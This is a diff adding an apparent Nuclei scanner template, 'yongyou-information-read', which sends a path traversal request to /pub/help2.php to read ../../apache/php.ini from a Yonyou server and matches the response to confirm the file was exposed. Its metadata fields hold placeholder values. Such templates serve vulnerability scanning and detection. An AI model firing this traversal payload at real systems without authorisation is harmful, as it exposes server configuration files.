@@ -1,0 +1,34 @@
+id: yongyou-information-read
+
+info:
+  name: yongyou-information-read
+  author: changge
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+requests:
+  - raw:
+      - |+
+        GET /pub/help2.php?key=../../apache/php.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Cookie: PHPSESSID=6c41jtje5h4i68eokbmpp2f4q7
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ;;;;;;;
+      - type: status
+        status:
+          - 200
